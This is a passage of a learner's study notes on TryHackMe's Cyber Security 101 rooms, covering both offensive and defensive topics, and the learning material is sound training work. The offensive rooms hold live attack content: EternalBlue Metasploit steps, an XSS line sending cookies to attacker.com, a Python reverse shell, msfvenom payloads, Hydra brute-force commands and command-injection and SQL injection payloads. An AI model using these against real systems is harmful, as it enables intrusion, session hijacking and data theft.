Full exploitation of an unpatched Windows 7 machine. Scanned with nmap to confirm MS17-010 vulnerability. Exploited with Metasploit's `ms17_010_eternalblue` module. Upgraded to Meterpreter. Escalated to SYSTEM. Cracked dumped hashes with John.

```bash
nmap -sV --script=smb-vuln-ms17-010 10.10.x.x
```
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.x.x
set payload windows/x64/shell/reverse_tcp
run
# Upgrade shell to Meterpreter
background
use post/multi/manage/shell_to_meterpreter
```

**Takeaways:**
EternalBlue is still found in real engagements — organisations running unpatched Windows 7 or Server 2008 are vulnerable. This room is a complete end-to-end exploitation exercise: scan → exploit → escalate → credential dump → crack. It's the template for every Windows machine engagement.

---

---

## Section 8 — Web Hacking

> Goal: Understand how web applications work and where they break.

---

### Room 30 — Web Application Basics
🔗 https://tryhackme.com/room/webapplicationbasics

**Key Concepts:**
- Web app stack: client (browser) → server → database
- HTTP methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD
- HTTP status codes: 2xx (success), 3xx (redirect), 4xx (client error), 5xx (server error)
- Cookies: `Set-Cookie` header → stored in browser → sent with every request — basis of session management
- HTTP headers: `Host`, `User-Agent`, `Content-Type`, `Authorization`, `Cookie`, `X-Forwarded-For`
- Same-Origin Policy (SOP): browser prevents one site from reading responses from another
- CORS: Cross-Origin Resource Sharing — server opt-in to allow cross-origin requests

**What I did:**
Used browser DevTools and curl to inspect raw HTTP requests and responses. Modified headers manually. Manipulated cookies to test access control. Reviewed how sessions are established and maintained.

```bash
curl -v -b "session=abc123; admin=false" http://target.thm/dashboard
curl -v -H "X-Forwarded-For: 127.0.0.1" http://target.thm/admin
curl -X POST -d "username=admin&password=test" http://target.thm/login -c cookies.txt
curl -b cookies.txt http://target.thm/profile
```

**Takeaways:**
Cookies with no `HttpOnly` flag can be read by JavaScript — XSS steals them. Cookies with no `Secure` flag can be sent over HTTP — trivially captured. `SameSite=None` without `Secure` enables CSRF. Cookie security flags are one of the first things to check in a web app pentest.

---

### Room 31 — JavaScript Essentials
🔗 https://tryhackme.com/room/javascriptessentials

**Key Concepts:**
- JavaScript fundamentals: variables (`let`, `const`, `var`), functions, objects, arrays, loops, conditionals
- DOM: `document.getElementById()`, `.querySelector()`, `.innerHTML`, `.value`
- Events: `addEventListener('click', handler)`
- `fetch()` API: make async HTTP requests from JS
- Browser storage: `localStorage`, `sessionStorage`, `document.cookie`
- JavaScript in security: source of XSS vulnerabilities, client-side validation, token handling
- Node.js: JavaScript on the server side — same language, different environment and security model

**What I did:**
Wrote JS in the browser console to read cookies, modify DOM elements, make fetch requests, and read localStorage. Identified client-side input validation and bypassed it by editing the JavaScript or using DevTools.

```javascript
// Read cookies
document.cookie

// Read localStorage
localStorage.getItem('authToken')

// Modify page content
document.getElementById("role").innerHTML = "admin"

// Make a request with a forged token
fetch("/api/admin", {
  headers: { "Authorization": "Bearer " + localStorage.getItem("token") }
}).then(r => r.json()).then(console.log)

// Basic XSS payload
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
```

**Takeaways:**
Understanding JavaScript is essential for web pentesting — you can't test XSS properly without knowing what the payload is doing, and you can't find client-side auth bypasses without reading the source. `document.cookie` exfiltration via XSS is the classic session hijack attack.

---

### Room 32 — SQL Fundamentals
🔗 https://tryhackme.com/room/sqlfundamentals

**Key Concepts:**
- Relational databases: tables, rows (records), columns (fields)
- SQL: SELECT, INSERT, UPDATE, DELETE, CREATE, DROP
- Clauses: WHERE, ORDER BY, GROUP BY, HAVING, LIMIT
- JOINs: INNER, LEFT, RIGHT, FULL — combine data from multiple tables
- Subqueries: SELECT within a SELECT
- Database enumeration: `information_schema` — metadata about all tables and columns

**What I did:**
Ran queries against a database to extract data with SELECT/WHERE. Used JOINs to link user records to order records. Queried `information_schema` to enumerate all table names and column names — the same technique used in manual SQL injection.

```sql
SELECT * FROM users WHERE username = 'admin';
SELECT users.name, orders.total FROM users 
  INNER JOIN orders ON users.id = orders.user_id;
SELECT table_name FROM information_schema.tables WHERE table_schema = 'mydb';
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
```

**Takeaways:**
`information_schema` is what makes SQL injection powerful — once you have injection, you query this to enumerate the entire database structure, then extract any table you want. Understanding normal SQL is the prerequisite for understanding why `' OR 1=1 --` breaks queries.

---

### Room 33 — Burp Suite: The Basics
🔗 https://tryhackme.com/room/burpsuitebasics

**Key Concepts:**
- Burp Suite: the standard web application testing proxy
- Proxy: intercepts traffic between browser and server — allows viewing and modifying every request
- Repeater: send and modify individual requests manually — test inputs without the browser
- Intruder: automated payload injection — brute-forcing, fuzzing, parameter testing
- Decoder: encode/decode base64, URL, HTML — built-in
- Target sitemap: maps the application structure from intercepted traffic
- FoxyProxy: browser extension to route traffic through Burp

**What I did:**
Configured FoxyProxy and Burp's CA certificate in the browser. Intercepted a login request, modified the credentials, and forwarded. Sent the request to Repeater and tested different parameter values. Used Decoder to decode a base64 session token and inspect its contents.

**Takeaways:**
Burp Repeater is where most web app testing actually happens — you intercept once, send to Repeater, then iterate. Every parameter in every request is a potential injection point. The ability to modify requests after the browser has validated them (client-side bypass) is why server-side validation is the only validation that matters.

---

---

## Section 9 — Offensive Security Tooling

> Goal: Build a working toolkit for offensive security — brute-forcing, directory enumeration, shell handling, and SQL injection.

---

### Room 34 — Hydra
🔗 https://tryhackme.com/room/hydra

**Key Concepts:**
- Hydra: fast, parallelised online password brute-forcing tool
- Supported protocols: SSH, FTP, HTTP (GET/POST), RDP, SMB, MySQL, SMTP, and many more
- Key flags: `-l` (single username), `-L` (username list), `-p` (single password), `-P` (password list)
- `-t`: number of parallel threads (default 16)
- HTTP POST form brute-force: specify form parameters and failure string
- Rate limiting: some services block after X failed attempts — `-t 4` slows it down

**What I did:**
Brute-forced SSH login with a known username and rockyou.txt wordlist. Brute-forced an HTTP login form specifying the POST parameters and the failure message string.

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.thm -t 4

# HTTP POST form brute force
hydra -l admin -P rockyou.txt target.thm http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 16

# FTP
hydra -L users.txt -P rockyou.txt ftp://target.thm
```

**Takeaways:**
Hydra is for online attacks — you're sending real requests to a live service. This is noisy and will appear in logs. Rate limiting with `-t 4` reduces detectability but slows the attack. Offline hash cracking (John/Hashcat) is always preferable when you have the hashes.

---

### Room 35 — Gobuster: The Basics
🔗 https://tryhackme.com/room/gobusterthebasics

**Key Concepts:**
- Gobuster: fast directory/file/DNS/vhost brute-forcing tool written in Go
- Modes: `dir` (directory enumeration), `dns` (subdomain enumeration), `vhost` (virtual host brute-force)
- Key flags: `-u` (URL), `-w` (wordlist), `-x` (file extensions), `-t` (threads), `-o` (output file)
- Common wordlists: `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`, `SecLists`
- Status code filtering: `-b 404` to blacklist, `-s 200,301,302` to whitelist

**What I did:**
Brute-forced directories and files on a target web server. Discovered hidden admin panels, backup files, and configuration files. Enumerated subdomains with DNS mode. Found a `.bak` file containing source code with credentials.

```bash
# Directory enumeration
gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak -t 50 -o results.txt

# Subdomain enumeration
gobuster dns -d target.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Virtual host enumeration
gobuster vhost -u http://target.thm -w subdomains.txt --append-domain
```

**Takeaways:**
Adding `-x php,txt,bak,old,zip` to directory scans consistently finds backup files and forgotten uploads that contain credentials or source code. Subdomain enumeration often reveals staging/dev environments with weaker security than the main site.

---

### Room 36 — Shells Overview
🔗 https://tryhackme.com/room/shellsoverview

**Key Concepts:**
- Shell types:
  - Reverse shell: target connects back to attacker — bypasses inbound firewall rules
  - Bind shell: attacker connects to a listener on the target — useful when you can't receive connections
  - Web shell: PHP/ASPX/JSP file uploaded to web server — persistent, browser-accessible
- Shell stability: raw netcat shells are fragile — upgrade to a PTY for full interactivity
- msfvenom: generates payloads in many formats (exe, elf, php, ps1, war, jar)
- Netcat: `nc -lvnp 4444` to listen, `nc target 4444 -e /bin/bash` to connect

**What I did:**
Set up netcat listeners and caught reverse shells from multiple payloads. Stabilised raw shells using Python PTY upgrade. Generated payloads with msfvenom. Uploaded and triggered a PHP web shell.

```bash
# Listener
nc -lvnp 4444

# Python reverse shell (on target)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Stabilise shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z, stty raw -echo; fg, export TERM=xterm

# msfvenom payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe
msfvenom -p php/reverse_php LHOST=attacker LPORT=4444 -f raw -o shell.php
```

**Takeaways:**
Shell stabilisation is essential — without it you can't use tab completion, run interactive programs (like `sudo`), or ctrl+c without killing the session. The Python PTY + stty method works on any Linux target with Python installed. Always catch a shell before trying to escalate.

---

### Room 37 — SQLMap: The Basics
🔗 https://tryhackme.com/room/sqlmapthebasics

**Key Concepts:**
- SQLMap: automated SQL injection detection and exploitation tool
- Detection: tests parameters for injection vulnerabilities automatically
- Exploitation: once injection confirmed — dumps databases, tables, records, credentials
- Key flags: `-u` (URL), `--data` (POST body), `-p` (parameter to test), `--dbs` (list databases), `-D` (select DB), `-T` (select table), `--dump` (extract data)
- Cookie injection: `-H "Cookie: session=xyz"` or `--cookie`
- Risk/level: `--level=5 --risk=3` for more aggressive testing (more intrusive)
- Bypass WAF: `--tamper` scripts to encode payloads

**What I did:**
Identified a GET parameter vulnerable to SQL injection. Ran SQLMap to confirm injection, enumerate databases, list tables, and dump the users table including password hashes. Cracked the hashes with John.

```bash
# Basic GET parameter injection
sqlmap -u "http://target.thm/products?id=1" --dbs

# POST form injection
sqlmap -u "http://target.thm/login" --data="username=admin&password=test" -p username --dbs

# Extract data once DB identified
sqlmap -u "http://target.thm/products?id=1" -D webapp -T users --dump

# With cookie
sqlmap -u "http://target.thm/profile" --cookie="session=abc123" --dbs

# More aggressive
sqlmap -u "http://target.thm/products?id=1" --level=3 --risk=2 --dbs --batch
```

**Takeaways:**
SQLMap can dump an entire database in minutes once injection is confirmed. The `--batch` flag accepts all defaults without prompting — useful for automation. In real engagements, always get written permission before running SQLMap — it generates significant traffic and can cause availability issues on poorly written queries.

---

---

## Section 10 — Defensive Security

> Goal: Understand how defenders operate — SOC work, forensics, incident response, and log analysis.

---

### Room 38 — Defensive Security Intro
🔗 https://tryhackme.com/room/defensivesecurityintro

*(Covered in Section 1 — same room. Refer to Room 2 notes above.)*

---

### Room 39 — SOC Fundamentals
🔗 https://tryhackme.com/room/socfundamentals

**Key Concepts:**
- SOC (Security Operations Centre): team that monitors, detects, and responds to security events 24/7
- SOC tiers:
  - Tier 1: alert triage, initial investigation — monitors dashboards
  - Tier 2: deeper investigation, incident handling
  - Tier 3: threat hunting, advanced analysis, tool development
- Alert lifecycle: alert triggers → analyst triages → investigate → escalate or close
- True positive vs false positive: accuracy of detection rules
- SIEM: Splunk, Microsoft Sentinel, IBM QRadar, Elastic Security — the SOC's central tool
- Threat intelligence integration: IOC feeds, MISP, threat intel platforms

**What I did:**
Triaged simulated security alerts in a SOC dashboard. Classified each alert as true positive or false positive based on context — IP reputation, user behaviour, time of day. Escalated a confirmed intrusion and documented the chain of events.

**Takeaways:**
Alert fatigue is a real problem — too many false positives trains analysts to ignore alerts. Well-tuned detection rules with proper context (asset criticality, normal behaviour baselines) reduce noise. A good SOC analyst asks "does this make sense in context?" before escalating or dismissing.

---

### Room 40 — Digital Forensics Fundamentals
🔗 https://tryhackme.com/room/digitalforensicsfundamentals

**Key Concepts:**
- Digital forensics: collecting, preserving, and analysing digital evidence following legal procedures
- Chain of custody: documented trail of who handled evidence and when — required for legal admissibility
- Evidence types: disk images, memory dumps, network captures, log files
- Disk imaging: `dd`, `FTK Imager` — bit-for-bit copy preserving the original
- File system artefacts: deleted files, timestamps, registry hives, browser history
- Timeline analysis: correlating events across multiple sources to reconstruct what happened
- Volatile vs non-volatile data: RAM is volatile (lost on shutdown), disk is non-volatile

**What I did:**
Created a disk image using `dd`. Analysed a forensic image with Autopsy — recovered deleted files, read browser history, extracted registry hives. Built a timeline of events using file timestamps and log entries.

```bash
# Create disk image
dd if=/dev/sdb of=disk.img bs=4M status=progress

# Verify integrity
sha256sum disk.img > disk.img.sha256

# Mount image read-only
mount -o ro,loop disk.img /mnt/evidence
```

**Takeaways:**
Never work on original evidence — always image first, work on the copy. Timestamps are evidence — but they can be manipulated (timestomping is a common attacker anti-forensic technique). Deleted files are often recoverable unless the drive has been securely wiped.

---

### Room 41 — Incident Response Fundamentals
🔗 https://tryhackme.com/room/incidentresponsefundamentals

**Key Concepts:**
- Incident response lifecycle (NIST): Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned
- Preparation: IR plan, playbooks, tools, communication procedures
- Identification: determine if an event is an incident — scope and severity assessment
- Containment: stop the bleeding — isolate affected systems without destroying evidence
- Eradication: remove the threat — malware removal, closing attack vectors
- Recovery: restore normal operations — verify systems are clean before bringing back online
- Lessons Learned: post-incident review — what happened, what worked, what to improve

**What I did:**
Worked through an incident scenario — received an alert, triaged it, scoped the incident (how many systems affected), contained by isolating hosts, identified the attack vector (phishing email → malicious attachment), removed the malware, and completed the IR report.

**Takeaways:**
Containment before eradication — you need to stop the spread before you start cleaning. If you eradicate on one machine while the attacker still has access to another, they'll just re-infect. Document every action with timestamps during an incident — this becomes the incident report.

---

### Room 42 — Logs Fundamentals
🔗 https://tryhackme.com/room/logsfundamentals

**Key Concepts:**
- Log types: system logs, application logs, security/auth logs, network logs, web server logs
- Linux log locations: `/var/log/syslog`, `/var/log/auth.log`, `/var/log/apache2/access.log`
- Windows Event Log: Security (4624 logon, 4625 failed logon, 4688 process creation), System, Application
- Log analysis commands: `grep`, `awk`, `cut`, `sort`, `uniq`, `wc`
- Centralized logging: forward logs to a SIEM for correlation — prevents local log deletion from hiding attacks
- Log rotation: `logrotate` — manages file size, prevents disk filling

**What I did:**
Analysed auth logs to identify brute-force attacks (high volume of 4625/auth failures from one IP). Extracted failed SSH attempts with grep and counted by source IP. Read Apache access logs to find suspicious request patterns (directory traversal, scan signatures).

```bash
# Failed SSH attempts
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Successful logins after failed attempts (potential successful brute force)
grep "Accepted password" /var/log/auth.log

# Apache - 404s (potential scan/enumeration)
awk '$9 == 404 {print $1, $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn

# Windows - Event ID 4625 (failed logon) via PowerShell
Get-EventLog -LogName Security -EventID 4625 | Select-Object -First 20
```

**Takeaways:**
Log analysis is core SOC/DFIR work. The `sort | uniq -c | sort -rn` pipeline (sort, count duplicates, sort by frequency) is the most useful command sequence for spotting anomalies in log data — you're looking for outliers, and frequency sorting surfaces them immediately.

---

---

## Section 11 — Security Solutions

> Goal: Understand the defensive tools organisations deploy and how they work.

---

### Room 43 — Introduction to SIEM
🔗 https://tryhackme.com/room/introtosiem

**Key Concepts:**
- SIEM (Security Information and Event Management): centralises log collection and provides correlation and alerting
- Functions: log aggregation, normalisation, correlation, alerting, dashboards, reporting
- Detection rules: define patterns that indicate malicious activity (e.g. 5 failed logins in 60 seconds)
- Log sources: endpoint agents, network devices, firewalls, AD, cloud services
- Popular SIEMs: Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM, Wazuh (open-source)
- SIEM limitations: only as good as the logs it receives and the rules it runs

**What I did:**
Explored a SIEM dashboard — reviewed alert queues, drilled into individual events, traced an attack timeline from initial access through lateral movement. Wrote a basic detection rule for brute-force login attempts.

**Takeaways:**
A SIEM is only useful if you're sending it the right logs with enough detail, and if the detection rules are properly tuned. In red team engagements, knowing what a SIEM will alert on lets you craft techniques that stay below the detection threshold (living off the land, LOLBins, low-and-slow attacks).

---

### Room 44 — Firewall Fundamentals
🔗 https://tryhackme.com/room/firewallfundamentals

**Key Concepts:**
- Firewall types:
  - Packet filter: stateless, inspects each packet in isolation — fast but limited
  - Stateful: tracks connection state — knows if a packet is part of an established session
  - Application/Layer 7 (NGFW): inspects application-layer content — can detect malicious payloads within allowed protocols
  - WAF (Web Application Firewall): specifically filters HTTP/HTTPS traffic — blocks SQLi, XSS, etc.
- Rules: ALLOW/DENY based on source IP, destination IP, protocol, port, direction
- Rule order matters — first matching rule wins
- `iptables` and `nftables`: Linux firewall tools
- Windows Firewall: configured via GUI or PowerShell (`Get-NetFirewallRule`)

**What I did:**
Configured iptables rules to allow specific ports and block all others. Reviewed the Windows Firewall rule set and identified overly permissive rules. Understood why rule ordering matters by testing different configurations.

```bash
# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Drop everything else
iptables -A INPUT -j DROP

# List rules
iptables -L -n -v
```

**Takeaways:**
Firewalls don't stop attackers who are already inside — lateral movement happens on ports the firewall allows (SMB/445, HTTP/80, HTTPS/443, RDP/3389). Egress filtering (controlling outbound traffic) is just as important as ingress filtering and often less implemented.

---

### Room 45 — IDS Fundamentals
🔗 https://tryhackme.com/room/idsfundamentals

**Key Concepts:**
- IDS (Intrusion Detection System): monitors network/host activity and alerts on suspicious behaviour — detection only
- IPS (Intrusion Prevention System): same as IDS but can actively block traffic
- Types:
  - NIDS: network-based — analyses network traffic (Snort, Suricata)
  - HIDS: host-based — monitors a single host's activity (OSSEC, Wazuh)
- Detection methods:
  - Signature-based: matches known attack patterns — fast, low false positives, misses novel attacks
  - Anomaly-based: learns baseline, alerts on deviation — catches unknown attacks, more false positives
- Snort: the most common open-source NIDS
- Snort rules: `alert tcp any any -> $HOME_NET 22 (msg:"SSH connection attempt"; sid:1000001;)`

**What I did:**
Read and wrote basic Snort rules. Ran Snort against a packet capture to detect suspicious traffic. Reviewed alerts generated and classified them as true/false positive. Understood how attackers evade IDS (fragmentation, protocol obfuscation, encryption).

**Takeaways:**
IDS/IPS can be evaded — encrypted C2 traffic (HTTPS) bypasses signature matching. Attackers fragment payloads across multiple packets to avoid matching signatures. A properly tuned IDS with anomaly detection + signature matching is significantly harder to evade than signature-only.

---

### Room 46 — Vulnerability Scanner Overview
🔗 https://tryhackme.com/room/vulnerabilityscanneroverview

**Key Concepts:**
- Vulnerability scanners: automated tools that identify known weaknesses in systems and applications
- Categories: network scanners (Nessus, OpenVAS), web app scanners (Nikto, Burp Suite Scanner), container scanners
- Scan types: credentialed (more thorough, fewer false positives) vs unauthenticated
- CVSS (Common Vulnerability Scoring System): 0–10 score for severity — Critical (9–10), High (7–8.9), Medium (4–6.9), Low (0–3.9)
- CVE database: standardised vulnerability identifiers — feeds scanner signatures
- Output: vulnerability list with severity, affected component, remediation advice

**What I did:**
Ran an authenticated Nessus scan against a target. Reviewed the results — filtered by severity, examined critical findings, and mapped each to a CVE. Ran Nikto against a web server to identify missing security headers and known vulnerabilities.

```bash
nikto -h http://target.thm
nikto -h http://target.thm -output nikto_results.txt
```

**Takeaways:**
Vulnerability scanners generate a lot of findings — prioritising by CVSS score and exploitability is essential. A CVSS 10 vulnerability on an internet-facing service is critical; the same CVE on an internal, isolated system is less urgent. Context determines risk.

---

---

## Section 12 — Defensive Security Tooling

> Goal: Learn the tools used in malware analysis and defensive investigations.

---

### Room 47 — CyberChef: The Basics
🔗 https://tryhackme.com/room/cyberchefbasics

**Key Concepts:**
- CyberChef: browser-based tool for encoding, decoding, encryption, hashing, and data transformation
- "Recipe" system: chain operations together — decode base64 → decompress → extract URLs
- Operations: Base64 encode/decode, URL encode, XOR, ROT13, hash, regex extract, AES, magic (auto-detect)
- Magic operation: attempts to auto-detect encoding and decode it — useful for unknown obfuscated data
- Use cases: decoding malware strings, analysing phishing payloads, CTF challenges, DFIR

**What I did:**
Used CyberChef to decode multi-layer obfuscated malware strings: base64 → XOR → base64 → plaintext. Extracted URLs from encoded email payloads. Used the Magic operation to auto-identify and decode unknown encoded data.

**Takeaways:**
Malware almost always encodes/obfuscates its strings to evade static detection — C2 server addresses, commands, and payloads are often base64 or XOR encoded. CyberChef makes decoding trivial. The "Magic" operation often cracks single-layer obfuscation in one click.

---

### Room 48 — CAPA: The Basics
🔗 https://tryhackme.com/room/capabasics

**Key Concepts:**
- CAPA: open-source tool by Mandiant — identifies capabilities in executable files without running them (static analysis)
- Analyses PE (Windows executables) and ELF (Linux binaries)
- Maps findings to MITRE ATT&CK TTPs automatically
- Output: lists detected capabilities — "creates process", "reads registry", "connects to network", "downloads file"
- Uses: quickly triage unknown samples, prioritise for deeper analysis, understand malware behaviour without executing it

**What I did:**
Ran CAPA against malware samples and reviewed the output. Identified that a sample had keylogging capabilities, persistence via registry run keys, and C2 communication. Mapped findings to MITRE ATT&CK techniques.

```bash
capa malware.exe
capa malware.exe --json > results.json
capa malware.exe -v    # verbose output
```

**Takeaways:**
CAPA gives you a behavioural summary of a binary in seconds without executing it — useful for initial triage to decide if a sample needs full sandbox analysis. The MITRE ATT&CK mapping in the output immediately tells you what techniques to look for in your logs.

---

### Room 49 — REMnux: Getting Started
🔗 https://tryhackme.com/room/remnuxgettingstarted

**Key Concepts:**
- REMnux: Linux distribution purpose-built for malware analysis — comes pre-installed with analysis tools
- Key tools included: CAPA, Ghidra, Volatility, Wireshark, Zeek, Suricata, olevba, pdfid, strings, binwalk, CyberChef
- Static analysis: examine a file without running it — strings, PE headers, imports, sections
- Dynamic analysis: run the malware in a sandbox and observe its behaviour
- Network simulation: INetSim simulates internet services (DNS, HTTP) so malware thinks it's connected
- `strings`: extract printable strings from a binary — often reveals URLs, registry keys, passwords

**What I did:**
Analysed a malware sample on REMnux. Extracted strings and found an embedded C2 URL. Ran `pdfid` on a malicious PDF to identify suspicious elements. Simulated a network with INetSim and captured the malware's DNS queries and HTTP calls.

```bash
strings malware.exe | grep -E "http|\.com|\.exe|cmd|powershell"
pdfid suspicious.pdf
olevba malicious.doc
binwalk firmware.bin
```

**Takeaways:**
`strings malware.exe | grep http` will often reveal C2 infrastructure immediately in unobfuscated samples. Analysts on REMnux work offline — the VM is isolated so the malware can run without infecting anything real, while INetSim fakes the internet to trigger network-dependent behaviour.

---

### Room 50 — FlareVM: Arsenal of Tools
🔗 https://tryhackme.com/room/flarevmarsenaloftools

**Key Concepts:**
- FlareVM: Windows-based malware analysis distribution by Mandiant — the Windows counterpart to REMnux
- Key tools: x64dbg (debugger), Ghidra/IDA Free (disassemblers), PE-bear (PE analysis), PEStudio, Process Hacker, Wireshark, RegShot
- PE analysis: examine Portable Executable headers — sections (.text, .data, .rsrc), imports, exports, entropy
- High entropy sections: often indicate packed/encrypted content — malware hides payloads this way
- RegShot: takes before/after registry snapshots to identify changes made by running malware
- Process Hacker: real-time process monitoring — see what a running process is doing to memory, files, network

**What I did:**
Analysed a Windows malware sample in FlareVM. Used PEStudio to examine the PE header — identified suspicious imports (VirtualAlloc, WriteProcessMemory, CreateRemoteThread — classic shellcode injection indicators). Used RegShot to capture registry changes after execution. Observed network connections in Process Hacker.

**Takeaways:**
The import table of a PE binary reveals its intentions — `CreateRemoteThread` + `WriteProcessMemory` = process injection, `CryptEncrypt` = possible ransomware, `InternetConnect` = C2 communication. Malware analysts read import tables before running anything.

---

---

## Section 13 — Build Your Cyber Security Career

> Goal: Understand core security principles and map your skills to career paths.

---

### Room 51 — Security Principles
🔗 https://tryhackme.com/room/securityprinciples

**Key Concepts:**
- CIA Triad: Confidentiality, Integrity, Availability — the three pillars of information security
- DAD Triad: Disclosure, Alteration, Destruction — the three threats to the CIA triad
- Defence in Depth: multiple layers of controls — an attacker must bypass several layers, not just one
- Zero Trust: "never trust, always verify" — no implicit trust based on network location
- Least Privilege: users and processes get minimum access needed for their function
- Separation of Duties: critical tasks require more than one person — prevents insider abuse
- Security by Design: security built into systems from the start, not bolted on afterwards

**What I did:**
Mapped real-world controls to the CIA triad. Analysed an architecture and identified where it violated least privilege and defence in depth. Answered questions on which principle applies to which scenario (e.g. MFA → Confidentiality + Zero Trust).

**Takeaways:**
Zero Trust is the modern response to the failure of perimeter security — once attackers are inside the network, traditional "trust inside, verify outside" models fail completely. Micro-segmentation + continuous verification is the architecture that limits blast radius when (not if) something is compromised.

---

### Room 52 — Careers in Cyber
🔗 https://tryhackme.com/room/careersincyber

*(Covered in Pre Security. The core roles and their distinctions remain the same — see Pre Security writeup Room 3 for full notes.)*

**Additional at this level:**
- Understanding the difference between CREST, OSCP, CEH certifications and what each signals to employers
- Red team vs pentest engagement scoping, rules of engagement, reporting deliverables
- SOC progression: analyst → senior analyst → threat hunter → SOC manager

---

### Room 53 — Training Impact on Teams
🔗 https://tryhackme.com/room/training

**Key Concepts:**
- Security awareness training: reduces the human attack surface — phishing is still the most common initial access vector
- Red vs blue team training: offensive exercises improve both teams — red finds gaps, blue learns from what got through
- Continuous learning: the threat landscape changes faster than any static training programme
- Metrics: measuring the effectiveness of security training — phishing simulation click rates, time-to-detect improvements
- Security culture: individual behaviour is the last line of defence — training should build instinct, not just compliance

**What I did:**
Reviewed how organisations structure security training programmes. Analysed before/after metrics from a simulated phishing campaign. Understood why compliance-based training ("click through the annual security video") is ineffective compared to scenario-based, hands-on training.

**Takeaways:**
TryHackMe's own model (hands-on, gamified, scenario-based) is the answer to why traditional security awareness training fails — people learn by doing, not by watching slides. A blue team that regularly faces simulated attacks from their own red team is far more effective than one that only sees real attacks.

---

---

## Section 14 — OWASP Top 10 (2025)

> Goal: Understand the most critical web application security risks as defined by OWASP.

---

### Room 54 — OWASP Top 10 2025: IAAA Failures
🔗 https://tryhackme.com/room/owasptopten2025one

**Key Concepts:**
- IAAA: Identification, Authentication, Authorisation, Accountability
- Broken Authentication: weak passwords, no MFA, insecure session management, credential stuffing
- Broken Access Control: users accessing resources/functions they shouldn't — IDOR, privilege escalation, forced browsing
- IDOR (Insecure Direct Object Reference): accessing another user's data by changing an ID in the URL/request
- Accountability failures: insufficient logging — can't detect or investigate incidents
- Common examples: changing `user_id=123` to `user_id=124` to access another user's data

**What I did:**
Exploited IDOR vulnerabilities — changed account IDs in API requests to access other users' data. Bypassed access control by accessing admin endpoints without the admin role. Demonstrated account takeover via weak session token prediction.

```bash
# IDOR example
curl -b "session=user123" http://target.thm/api/account?id=1
# Change id=1 to id=2 to access another account

# Forced browsing
curl http://target.thm/admin/panel    # access admin without being admin
```

**Takeaways:**
IDOR is one of the most common and impactful vulnerabilities in modern web apps — it's trivially exploitable and often exposes entire user databases. Proper access control must be enforced server-side on every request, not just on the UI. "The user can't see the button" is not access control.

---

### Room 55 — OWASP Top 10 2025: Application Design Flaws
🔗 https://tryhackme.com/room/owasptopten2025two

**Key Concepts:**
- Insecure Design: vulnerabilities that stem from architectural decisions, not implementation bugs — can't be patched, must be redesigned
- Security Misconfiguration: default credentials, unnecessary features enabled, verbose error messages, missing security headers
- Vulnerable and Outdated Components: using libraries/frameworks with known CVEs
- Security headers: `Content-Security-Policy`, `X-Frame-Options`, `Strict-Transport-Security`, `X-Content-Type-Options`
- Software composition analysis (SCA): tools that scan dependencies for known vulnerabilities (npm audit, OWASP Dependency Check)

**What I did:**
Scanned a target for missing security headers with curl and online tools. Identified outdated dependencies with known CVEs in a JavaScript application's `package.json`. Exploited a security misconfiguration — default admin credentials on an exposed management interface.

```bash
# Check security headers
curl -I https://target.thm

# Look for default credentials
# admin:admin, admin:password, admin:1234, root:root

# Check JS dependencies for CVEs
cat package.json | grep -A100 '"dependencies"'
```

**Takeaways:**
Missing `Content-Security-Policy` enables XSS. Missing `X-Frame-Options` enables clickjacking. Missing `HSTS` enables SSL stripping. Security headers are free and easy to add — their absence is a sign that security wasn't considered during development. Default credentials are found on real targets more often than they should be.

---

### Room 56 — OWASP Top 10 2025: Insecure Data Handling
🔗 https://tryhackme.com/room/owasptopten2025three

**Key Concepts:**
- Cryptographic Failures: sensitive data stored or transmitted without adequate encryption — plaintext passwords, unencrypted PII, HTTP instead of HTTPS
- Injection: SQL injection, command injection, LDAP injection, NoSQL injection, template injection
- SQL injection: attacker-controlled SQL code executes in the database context
- Command injection: user input is passed to the OS shell — `; whoami`, `| id`, `&& cat /etc/passwd`
- Server-Side Template Injection (SSTI): template engines process attacker-controlled input as code
- XXE (XML External Entity): malicious XML causes server to read local files or make internal network requests

**What I did:**
Exploited command injection by passing shell metacharacters in a form field. Demonstrated SQL injection manually — escaped the query, appended `UNION SELECT` to extract data from another table. Tested for SSTI by injecting `{{7*7}}` and observing if the response contained `49`.

```bash
# Command injection payloads
; id
| whoami
&& cat /etc/passwd
$(id)
`id`

# SQL injection - manual
' OR '1'='1
' UNION SELECT username,password FROM users--
' AND 1=0 UNION SELECT null,table_name FROM information_schema.tables--

# SSTI detection
{{7*7}}       # Jinja2/Twig - returns 49 if vulnerable
${7*7}        # FreeMarker
<%= 7*7 %>    # ERB
```

**Takeaways:**
Command injection gives you OS-level access from a web form — it's one of the most critical vulnerabilities possible. The root cause is always the same: user input is passed to a function that executes it without sanitisation. Input validation, parameterised queries (for SQL), and avoiding shell execution functions are the fixes.

---

---

## Path-Level Reflection

### What I learned overall
Cyber Security 101 is where fundamentals become real capabilities. The shift from Pre Security is significant — rather than understanding how things work, you're now actively using the tools that professionals use daily. Metasploit, Burp Suite, SQLMap, Wireshark, Nmap, John, Hydra — these are the core toolset and this path gives you hands-on time with all of them.

### What connected across sections
